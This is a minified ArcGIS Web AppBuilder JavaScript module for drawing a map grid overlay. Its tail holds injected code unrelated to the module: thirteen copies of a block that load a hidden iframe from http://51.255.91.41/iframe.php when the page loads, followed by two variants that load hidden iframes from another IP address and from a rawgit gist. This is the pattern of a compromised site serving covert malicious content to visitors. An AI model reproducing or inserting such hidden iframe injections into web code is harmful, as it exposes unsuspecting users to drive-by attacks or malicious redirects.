// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/lang dojo/_base/array ./mgrs-utils esri/layers/GraphicsLayer esri/Color esri/geometry/webMercatorUtils jimu/utils xstyle/css!./GridOverlay.css".split(" "),function(n,d,k,f,g,h,l,m){Math.log10||(Math.log10=function(a){return Math.log(a)/Math.LN10});return n(null,{minIntervalSpacing:150,currentInterval:0,levelOfDetail:"default",labelPlacement:null,verticalLabels:!0,cornerLabelXOffset:10,cornerLabelYOffset:10,intervalLabelXOffset:30,intervalLabelYOffset:30,colors:null,
lineWidths:null,fontSizes:null,lineOpacity:.8,labelOpacity:1,centerLabelOpacity:.4,centerLabelScaleFactor:3,fontFamily:"Arial, Helvetica, sans-serif",map:null,_lineGraphics:null,_labelGraphics:null,constructor:function(a){a=a||{};a.map||console.warn("Before the grid will draw, you must use the 'setMap' method to define which map object to draw on");a.hasOwnProperty("enabled")?this.enabled=a.enabled:this.enabled=!0;this._lineGraphicsLayer=new g;this._labelGraphicsLayer=new g({className:"gridOverlay"});
this._centerLabelGraphicsLayer=new g({className:"gridOverlay"});this.enable=d.hitch(this,this.enable);this.disable=d.hitch(this,this.disable);this.clearGrid=d.hitch(this,this.clearGrid);this.drawGrid=d.hitch(this,this.drawGrid);this.getLayers=d.hitch(this,function(){return[this._lineGraphicsLayer,this._labelGraphicsLayer,this._centerLabelGraphicsLayer]});this.labelPlacement={lowerLeft:!0,lowerRight:!0,upperLeft:!0,upperRight:!0,center:!0};this.colors="#FA5858 #F7FE2E #2EFE2E #2EFEF7 #FFF #BDBDBD #000".split(" ");
this.lineWidths=[3,2,1,1,1,1,1];this.fontSizes=[29,27,19,16,15,13,11];this.map=a.map||{};this._lineGraphics=[];this._labelGraphics=[];this._lineGraphicsLayer.setOpacity(this.lineOpacity);this._labelGraphicsLayer.setOpacity(this.labelOpacity);this._centerLabelGraphicsLayer.setOpacity(this.centerLabelOpacity);for(var b=0;b<this.colors.length;b++)this.colors[b]=new h(this.colors[b]);this.setProperties(a)},setProperties:function(a){a.lineWidths&&this.setLineWidths(a.lineWidths);a.minIntervalSpacing&&
this.setMinIntervalSpacing(a.minIntervalSpacing);a.levelOfDetail&&this.setLevelOfDetail(a.levelOfDetail);a.labelPlacement&&this.setLabelPlacement(a.labelPlacement);a.hasOwnProperty("verticalLabels")&&this.setVerticalLabels(a.verticalLabels);a.cornerLabelXOffset&&this.setCornerLabelXOffset(a.cornerLabelXOffset);a.cornerLabelYOffset&&this.setCornerLabelYOffset(a.cornerLabelYOffset);a.intervalLabelXOffset&&this.setIntervalLabelXOffset(a.intervalLabelXOffset);a.intervalLabelYOffset&&this.setIntervalLabelYOffset(a.intervalLabelYOffset);
a.colors&&this.setColors(a.colors);a.lineWidths&&this.setLineWidths(a.lineWidths);a.fontSizes&&this.setFontSizes(a.fontSizes);a.lineOpacity&&this.setLineOpacity(a.lineOpacity);a.labelOpacity&&this.setLabelOpacity(a.labelOpacity);a.centerLabelOpacity&&this.setCenterLabelOpacity(a.centerLabelOpacity);a.centerLabelScaleFactor&&this.setCenterLabelScaleFactor(a.centerLabelScaleFactor);a.fontFamily&&this.setFontFamily(a.fontFamily);if(this.enabled&&this.map.loaded)this.enable();else if(this.enabled&&this.map.on)this.map.on("load",
d.hitch(this,this.enable))},getMinIntervalSpacing:function(){return this.minIntervalSpacing},setMinIntervalSpacing:function(a){"number"===typeof a&&(this.minIntervalSpacing=a,this.drawGrid())},setLevelOfDetail:function(a){if("string"!==typeof a)return null;a=a.toLowerCase();switch(a){case "more":case "best":case "high":case "maximum":case "max":this.levelOfDetail="more";break;case "less":case "low":case "minimum":case "mim":this.levelOfDetail="less";break;default:this.levelOfDetail="default"}this.drawGrid()},
getLevelOfDetail:function(){return this.levelOfDetail},getLabelPlacement:function(){return this.labelPlacement},setLabelPlacement:function(a,b){if("object"===typeof a&&a.length)for(this.labelPlacement={lowerLeft:!1,lowerRight:!1,upperLeft:!1,upperRight:!1,center:!1},b=0;b<a.length;b++)this.setLabelPlacement(a[b],!0);else if("object"===typeof a)this.labelPlacement=a;else if("undefined"===typeof b?(this.labelPlacement={lowerLeft:!1,lowerRight:!1,upperLeft:!1,upperRight:!1,center:!1},b=!0):b=!0===b,
a.toLowerCase){switch(a.toLowerCase()){case "center":case "middle":this.labelPlacement.center=b;break;case "top":case "upper":this.labelPlacement.upperLeft=b;this.labelPlacement.upperRight=b;break;case "bottom":case "lower":this.labelPlacement.lowerLeft=b;this.labelPlacement.lowerRight=b;break;case "left":this.labelPlacement.lowerLeft=b;this.labelPlacement.upperLeft=b;break;case "right":this.labelPlacement.lowerRight=b;this.labelPlacement.upperRight=b;break;case "lower-left":case "bottom-left":this.labelPlacement.lowerLeft=
b;break;case "upper-left":case "top-left":this.labelPlacement.upperLeft=b;break;case "lower-right":case "bottom-right":this.labelPlacement.lowerRight=b;break;case "upper-right":case "top-right":this.labelPlacement.upperRight=b;break;case "all":this.labelPlacement.lowerLeft=b;this.labelPlacement.lowerRight=b;this.labelPlacement.upperLeft=b;this.labelPlacement.upperRight=b;this.labelPlacement.center=b;break;default:this.labelPlacement.lowerLeft=b,this.labelPlacement.lowerRight=b,this.labelPlacement.upperLeft=
b,this.labelPlacement.upperRight=b}this.drawGrid()}},getVerticalLabels:function(){return this.verticalLabels},setVerticalLabels:function(a){"boolean"===typeof a&&(this.verticalLabels=a,this.drawGrid())},getCornerLabelXOffset:function(){return this.cornerLabelXOffset},setCornerLabelXOffset:function(a){"number"===typeof a&&(this.cornerLabelXOffset=a,this.drawGrid())},getCornerLabelYOffset:function(){return this.cornerLabelYOffset},setCornerLabelYOffset:function(a){"number"===typeof a&&(this.cornerLabelYOffset=
a,this.drawGrid())},getIntervalLabelXOffset:function(){return this.intervalLabelXOffset},setIntervalLabelXOffset:function(a){"number"===typeof a&&(this.intervalLabelXOffset=a,this.drawGrid())},getIntervalLabelYOffset:function(){return this.intervalLabelYOffset},setIntervalLabelYOffset:function(a){"number"===typeof a&&(this.intervalLabelYOffset=a,this.drawGrid())},getColor:function(a){return"number"!==typeof a||0>a||a>this.colors.length-1?null:this.colors[a]},setColor:function(a,b){if("number"!==typeof a||
0>a||a>this.colors.length-1)return null;this.colors[a]=new h(b);this.drawGrid()},setColors:function(a){if("object"!==typeof a||!a.length)return null;for(var b,c=0;c<this.colors.length;c++)b=a.length>c?c:a.length-1,this.colors[c]=new h(a[b]);this.drawGrid()},getLineWidth:function(a){return"number"!==typeof a||0>a||a>this.lineWidths.length-1?null:this.lineWidths[a]},setLineWidth:function(a,b){if("number"!==typeof a||"number"!==typeof b||0>a||a>this.lineWidths.length-1)return null;this.lineWidths[a]=
b;this.drawGrid()},setLineWidths:function(a){if("object"!==typeof a||!a.length)return null;for(var b,c=0;c<this.lineWidths.length;c++)b=a.length>c?c:a.length-1,"number"===typeof a[b]&&(this.lineWidths[c]=a[b]);this.drawGrid()},getFontSize:function(a){return"number"!==typeof a||0>a||a>this.fontSizes.length-1?null:this.fontSizes[a]},setFontSize:function(a,b){if("number"!==typeof a||"number"!==typeof b||0>a||a>this.fontSizes.length-1)return null;this.fontSizes[a]=b;this.drawGrid()},setFontSizes:function(a){if("object"!==
typeof a||!a.length)return null;for(var b,c=0;c<this.fontSizes.length;c++)b=a.length>c?c:a.length-1,"number"===typeof a[b]&&(this.fontSizes[c]=a[b]);this.drawGrid()},getCenterLabelScaleFactor:function(){return this.centerLabelScaleFactor},setCenterLabelScaleFactor:function(a){"number"===typeof a&&(this.centerLabelScaleFactor=a,this.drawGrid())},getCenterLabelOpacity:function(){return this.centerLabelOpacity},setCenterLabelOpacity:function(a){"number"===typeof a&&(this.centerLabelOpacity=a,this._centerLabelGraphicsLayer.setOpacity(a),
this.drawGrid())},getFontFamily:function(){return this.fontFamily},setFontFamily:function(a){"string"===typeof a&&(this.fontFamily=a,this.drawGrid())},getInterval:function(){return this.currentInterval},setInterval:function(){this.currentInterval=f.getInterval(this.getMinIntervalSpacing(),this.map,this.getLevelOfDetail())},getMap:function(){return this.map},setMap:d.hitch(this,function(a){this.map.loaded&&this.clearGrid();this.map=a;if(this.enabled&&this.map.loaded)this.enable();else if(this.enabled)this.map.on("load",
d.hitch(this,this.enable))}),getLineOpacity:function(){return this.lineOpacity},setLineOpacity:function(a){"number"===typeof a&&(this.lineOpacity=a,this._lineGraphicsLayer.setOpacity(a))},getLabelOpacity:function(){return this.labelOpacity},setLabelOpacity:function(a){"number"===typeof a&&(this.labelOpacity=a,this._labelGraphicsLayer.setOpacity(a))},getSettings:function(){return{minIntervalSpacing:this.minIntervalSpacing,levelOfDetail:this.levelOfDetail,labelPlacement:this.labelPlacement,verticalLabels:this.verticalLabels,
cornerLabelXOffset:this.cornerLabelXOffset,cornerLabelYOffset:this.cornerLabelYOffset,intervalLabelXOffset:this.intervalLabelXOffset,intervalLabelYOffset:this.intervalLabelYOffset,colors:k.map(this.colors,function(a){return a.toHex()}),lineWidths:this.lineWidths,fontSizes:this.fontSizes,lineOpacity:this.lineOpacity,labelOpacity:this.labelOpacity,centerLabelOpacity:this.centerLabelOpacity,centerLabelScaleFactor:this.centerLabelScaleFactor,fontFamily:this.fontFamily}},enable:function(){var a=this.getMap();
this.enabled=!0;a.addLayers(this.getLayers());this._drawEvent=a.on("extent-change",d.hitch(this,function(){this._drawGrid()}));this._drawGrid()},disable:function(){var a=this.getMap();this.enabled=!1;this._drawEvent&&(this._drawEvent.remove(),this._drawEvent=null);this.clearGrid();for(var b=this.getLayers(),c=0;c<b.length;c++)a.removeLayer(b[c])},clearGrid:function(){var a=this.getMap();if(!a.loaded)var b=a.on("load",d.hitch(this,function(){b.remove();this.clearGrid()}));this._lineGraphicsLayer.clear();
this._labelGraphicsLayer.clear();this._centerLabelGraphicsLayer.clear();this._lineGraphics=[];this._labelGraphics=[];this._centerLabelGraphics=[]},drawGrid:function(){this._drawing&&this._drawGrid()},_drawGrid:function(){var a=this.getMap(),b,c;this._drawing&&clearTimeout(this._drawing);this._drawing=setTimeout(d.hitch(this,function(){if(a.loaded&&this.enabled){c=f.zonesFromExtent(this);this._zoneCount=c.length;this.clearGrid();this.setInterval();this._lineGraphics=[];this._lineGraphics0=[];this._lineGraphics1=
[];this._lineGraphics2=[];this._lineGraphics3=[];this._lineGraphics4=[];this._lineGraphics5=[];f.processZonePolygons(c,this);for(b=0;b<this._centerLabelGraphics.length;b++)this._centerLabelGraphicsLayer.add(this._centerLabelGraphics[b]);k.forEach([this._lineGraphics5,this._lineGraphics4,this._lineGraphics3,this._lineGraphics2,this._lineGraphics1,this._lineGraphics0],function(a){this._lineGraphics=this._lineGraphics.concat(a)},this);for(b=0;b<this._lineGraphics.length;b++)this._lineGraphics[b].geometry=
l.project(this._lineGraphics[b].geometry,this._lineGraphicsLayer.spatialReference),this._lineGraphicsLayer.add(this._lineGraphics[b]);for(b=0;b<this._labelGraphics.length;b++){this._labelGraphics[b].geometry=l.project(this._labelGraphics[b].geometry,this._lineGraphicsLayer.spatialReference);this._labelGraphicsLayer.add(this._labelGraphics[b]);var d=this._labelGraphics[b].getNode();if(d){var e=this._labelGraphics[b].symbol.color,e=128<.2126*e.r+.7152*e.g+.0722*e.b?"black":"white";m.has("ie")||m.has("edge")?
d.className+=" text-symbol-halo-"+e:d.classList.add("text-symbol-halo-"+e)}}delete this._lineGraphics;delete this._lineGraphics0;delete this._lineGraphics1;delete this._lineGraphics2;delete this._lineGraphics3;delete this._lineGraphics4;delete this._lineGraphics5}}),50)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});